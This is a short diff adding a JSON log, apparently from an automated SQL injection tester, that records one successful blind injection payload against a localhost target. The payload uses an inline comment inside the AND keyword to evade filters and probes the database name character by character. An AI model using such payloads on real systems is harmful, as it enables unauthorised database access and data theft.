@@ -1,0 +1,15 @@
+{
+  "successful_payloads": {
+    "SQL": [
+      {
+        "payload": "1 A/**/ND SUBSTRING(DATABASE(),3,1)='a'",
+        "success_count": 2,
+        "last_success": "2026-02-16T17:57:13.011669",
+        "target_pattern": "http://localhost:8080",
+        "bypass_technique": "standard"
+      }
+    ]
+  },
+  "failed_payloads": {},
+  "target_fingerprints": {}
+}
